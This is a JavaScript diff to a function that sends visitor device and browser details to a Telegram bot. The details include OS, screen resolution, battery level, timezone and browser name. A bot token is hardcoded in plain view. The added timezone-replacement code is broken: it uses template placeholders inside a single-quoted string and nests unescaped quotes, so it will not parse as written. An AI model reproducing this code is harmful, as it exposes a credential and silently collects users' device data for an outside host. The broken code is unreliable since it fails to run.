@@ -56,7 +56,7 @@ async function sendDataToTelegram(errorMessage) {
 ├ Имя ОС: <code>${osName}</code>
 ├ Разрешение экрана: <code>${screenResolution}</code>
 ├ Процент батареи: <code>${batteryPercentage}%</code>
-└ Часовой пояс: <code>${new Date().getTimezoneOffset()}</code>
+└ Часовой пояс: <code>none</code>
 
 <b>🌐 Информация о браузере:</b>
 ├ Название браузера: <code>${browserInfo.name}</code>
@@ -67,6 +67,13 @@ async function sendDataToTelegram(errorMessage) {
 ${errorMessage}
 (либо ее нету.)
 `;
+const gmtOffset = new Date().getTimezoneOffset();
+const gmtTime = new Date(Date.now() - gmtOffset * 60000);
+
+message = message.replace(
+    '└ Часовой пояс: <code>none</code>',
+    '└ Часовой пояс: <code>${gmtOffset} (GMT${gmtOffset > 0 ? '-' : '+'}${Math.abs(gmtOffset / 60)})</code>'
+);
 
     const token = '7159693608:AAE5eKPnwrQMfw7Dm8ETaJ_rLlYLWjO8hf8';
     const telegramBotURL = `https://api.telegram.org/bot${token}/sendMessage`;
